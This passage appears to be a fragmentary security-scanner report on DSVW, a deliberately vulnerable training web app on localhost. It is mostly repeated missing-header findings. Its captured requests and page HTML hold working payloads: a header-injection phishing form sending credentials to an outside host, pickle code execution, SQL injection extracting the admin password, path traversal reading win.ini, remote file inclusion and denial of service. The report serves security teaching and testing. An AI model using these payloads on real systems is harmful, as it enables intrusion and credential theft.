<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>
</body>
</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        3. GET http://127.0.0.1:65412/?charset=utf8
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (382 bytes) 
          GET http://127.0.0.1:65412/?charset=utf8 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>

<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>

<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>
</body>
</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        4. GET http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (1045 bytes) 
          GET http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E HTTP/1.1

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type.           Parameter 
          X-Content-Type-Options
          Solution

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        7. GET http://127.0.0.1:65412/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        8. GET http://127.0.0.1:65412/?comment=true
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (382 bytes) 
          GET http://127.0.0.1:65412/?comment=true HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:42 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (1319 bytes) 
          <!DOCTYPE html>
<html>
<head>
<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
<title>Damn Small Vulnerable Web (DSVW) &lt; 100 LoC (Lines of Code)</title>
</head>

<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        9. GET http://127.0.0.1:65412/?domain=www.google.com
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

          X-Content-Type-Options

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        10. GET http://127.0.0.1:65412/?foobar
          Alert tags
          • OWASP_2021_A05

This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>

<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>

</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        11. GET http://127.0.0.1:65412/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        12. GET http://127.0.0.1:65412/?id=2
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

<li>Blind SQL Injection (<i>boolean</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27" onclick="alert('checking if the first character for admin\'s password is digit \'7\' (true in case of same result(s) as for \'vulnerable\')')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique" target="_blank">info</a></li>
<li>Blind SQL Injection (<i>time</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))" onclick="alert('checking if the second character for admin\'s password is letter \'e\' (true in case of delayed response)')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique" target="_blank">info</a></li>
<li>UNION SQL Injection - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#union-exploitation-technique" target="_blank">info</a></li>

<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>

<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>
</body>
</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        16. GET http://127.0.0.1:65412/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (434 bytes) 
          GET http://127.0.0.1:65412/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (172 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:48 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/plain; charset=utf8
          Response body (1 byte) 
          0
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        17. GET http://127.0.0.1:65412/?path=
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (375 bytes) 
          GET http://127.0.0.1:65412/?path= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:13 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes)

<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>

<li>Source Code Disclosure - <a href="/?path=">vulnerable</a>|<a href="/?path=dsvw.py">exploit</a>|<a href="https://www.imperva.com/resources/glossary?term=source_code_disclosure" target="_blank">info</a></li>
<li>Path Traversal - <a href="/?path=">vulnerable</a>|<a href="/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini">exploit</a>|<a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank">info</a></li>
<li>File Inclusion (<i>remote</i>) - <a href="/?include=">vulnerable</a>|<a href="/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&amp;cmd=ipconfig">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">info</a></li>
<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>
</body>
</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        18. GET http://127.0.0.1:65412/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (423 bytes) 
          GET http://127.0.0.1:65412/?path=%5C%5C127.0.0.1%5CC%24%5CWindows%5Cwin.ini HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/?path=
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (172 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:15 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/plain; charset=utf8
          Response body (92 bytes) 
          ; for 16-bit app support

[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        19. GET http://127.0.0.1:65412/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

        20. GET http://127.0.0.1:65412/?path=dsvw.py
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.

          #!/usr/bin/env python
import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required
try:
    import lxml.etree
except ImportError:
    print("[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\n" % ("apt-get install python-lxml" if os.name != "nt" else "https://pypi.python.org/pypi/lxml"))

